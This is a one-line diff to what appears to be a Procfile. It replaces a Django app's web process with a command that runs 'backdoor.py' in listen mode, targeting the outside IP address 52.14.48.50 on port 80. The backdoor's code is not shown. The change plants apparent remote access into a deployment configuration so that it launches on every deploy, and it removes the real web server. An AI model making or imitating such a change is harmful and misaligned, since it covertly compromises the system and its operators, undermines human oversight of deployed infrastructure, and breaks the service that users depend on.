@@ -1,1 +1,1 @@
-web: python manage.py runserver 0.0.0.0:5000
+web: python backdoor.py --listen --target 52.14.48.50 --port 80
